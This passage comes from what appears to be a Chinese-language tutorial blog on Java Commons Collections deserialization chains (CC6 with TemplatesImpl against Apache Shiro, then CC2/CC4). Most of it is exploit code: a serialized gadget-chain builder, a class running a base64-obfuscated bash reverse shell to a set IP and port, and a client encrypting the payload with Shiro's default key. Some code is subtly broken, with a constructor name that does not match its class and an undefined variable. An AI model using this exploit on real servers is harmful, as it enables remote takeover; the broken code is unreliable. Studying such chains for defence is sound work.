&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;HelloTemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;HelloTemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_tfactory&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getClass&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">innerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformer&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TiedMapEntry&lt;/span> &lt;span style="color:#111">tme&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TiedMapEntry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">expMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">expMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">tme&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;valuevalue&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">clear&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 同outerMap.clear()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformer&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;iMethodName&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;newTransformer&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">expMap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">field&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>恶意类&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ysoserial.payloads&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.DOM&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.TransletException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xml.internal.dtm.DTMAxisIterator&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xml.internal.serializer.SerializationHandler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC6ShiroEvil&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">DOM&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">SerializationHandler&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">handlers&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">TransletException&lt;/span> &lt;span style="color:#f92672">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">DOM&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">DTMAxisIterator&lt;/span> &lt;span style="color:#111">iterator&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">SerializationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">TransletException&lt;/span> &lt;span style="color:#f92672">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Evil&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hello TemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getRuntime&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTMxLzIyMjIgMD4mMQ==}|{base64,-d}|{bash,-i}&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>通过Client.java装配CC6Shiro&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ysoserial.payloads&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javassist.ClassPool&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javassist.CtClass&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.shiro.crypto.AesCipherService&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.shiro.util.ByteSource&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC6ShiroClient&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ClassPool&lt;/span> &lt;span style="color:#111">pool&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ClassPool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDefault&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">CtClass&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ysoserial&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">payloads&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">testCC6ShiroEvil&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">testCC6Shiro&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getPayload&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toBytecode&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">AesCipherService&lt;/span> &lt;span style="color:#111">aes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">AesCipherService&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">util&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDecoder&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">decode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;kPH+bIxk5D2deZiIxcaaaA==&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteSource&lt;/span> &lt;span style="color:#111">ciphertext&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">aes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">payloads&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ciphertext&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>由于我在Linux上测试，就不弹计算器，直接弹shell&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302030308598.png" alt="image-20220302030308598">&lt;/p>
&lt;p>效果拔群！！！！！！&lt;/p>
&lt;p>这一节我们将&lt;code>TemplatesImpl&lt;/code>和CC6结合在一起，同时解决了CC3高版本利用不了的问题&lt;/p>
&lt;h2 id="cc2---cc4">CC2 - cc4&lt;/h2>
&lt;p>CC反序列化利用链被提出时，cc依赖有以下两个版本，groupId和artifactId都不一样&lt;/p>
&lt;ul>
&lt;li>commons-collections:commons-collections&lt;/li>
&lt;li>org.apache.commons:commons-collection4&lt;/li>
&lt;/ul>
&lt;p>表现在我们构造exp的区别是将&lt;code>decorate&lt;/code>改为了&lt;code>LazyMap&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">factory&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">factory&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">V&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">K&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">V&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#75af00">LazyMap&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">V&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span> &lt;span style="color:#00a8c8">super&lt;/span> &lt;span style="color:#111">K&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">V&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">factory&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">V&lt;/span>&lt;span style="color:#f92672">&amp;gt;(&lt;/span>&lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">factory&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>直接把gadget改一下名字即可；不过为了专门适配cc4，ysoserial也有专门的链子CC2和CC4&lt;/p>
&lt;p>cc包之所以能找出这么多链子，除了相当基础以外，更多的原因在于它包含了很多可以执行任意方法的Transformer，所以找链子的过程相当于找一条从&lt;code>Serializable#readObject&lt;/code>到&lt;code>Transformer#transform&lt;/code>方法的调用链&lt;/p>
&lt;p>我们分析一下CC2，它用到的关键类有&lt;code>java.util.PriorityQueue&lt;/code>和&lt;code>org.apache.commons.collections4.comparators.TransformingComparator&lt;/code>（可通过comprare调用transform）&lt;/p>
&lt;p>&lt;code>java.util.PriorityQueue&lt;/code>重写了&lt;code>readObject&lt;/code>方法&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ObjectInputStream&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">IOException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ClassNotFoundException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Read in size, and any hidden stuff
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">defaultReadObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Read in (and discard) array length
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readInt&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
